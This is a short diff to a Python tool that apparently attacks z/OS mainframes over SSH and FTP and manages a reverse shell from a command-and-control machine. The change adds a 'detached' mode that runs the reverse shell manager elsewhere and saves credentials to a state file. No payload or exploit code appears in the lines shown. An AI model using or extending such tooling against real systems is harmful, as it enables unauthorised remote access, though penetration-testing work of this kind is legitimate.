@@ -6,6 +6,7 @@ from string import Template
 from configparser import ConfigParser, ExtendedInterpolation
 import getpass
 import logging
+import pickle
 # Import from the current project
 from sshutils import ssh_utils
 from zosutils import FTP, Job
@@ -48,7 +49,7 @@ def parse_configuration():
     parser.add_argument('config_file', type=str,
                         help='configuration file to use')
     parser.add_argument('-d', '--detached', default=False, action='store_true',
-                        help='run in detached mode, where the attack machine and the CC server are different nodes')
+                        help='run in detached mode, use the config file (from -s) to run the reverse shell manager on another machine')
     parser.add_argument('-s', '--savestate', type=str,
                         help='save the running configuration (including credentials) to a config file',
                         default=None)
@@ -58,6 +59,10 @@ def parse_configuration():
     parser.add_argument('-v', '--verbose', default=False, action='store_true',
                         help='output verbose progress')
     cli_args = parser.parse_args()
+    # Validate the detached mode
+    if cli_args.detached and cli_args.savestate is None:
+        print('You need -s for -d')
+        sys.exit(1)
     # Config file parsing
     config_file = ConfigParser(interpolation=ExtendedInterpolation())
     config_file.read(cli_args.config_file)
@@ -186,11 +191,12 @@ if __name__ == '__main__':
             global_config.write(configfile)
 
     # Reverse shell management
+    if args.detached:
+        print('Running in detatched mode, no shell activation:')
+        print('Activate the reverse shell with the', args.savestate, 'file')
+        input('And finally press enter to launch the shell on the target...')
     if args.testfilename:
         print('Skipping the shell activation, test mode on. Test file in', testpath)
-    elif args.detached:
-        print('Running in detatched mode, no shell activation:')
-        print('Mainframe command:\n', ssh_step)
     else:
         command = config['shell_command'].split(' ')
         shell = ReverseShellManager(command, config['codepage'],
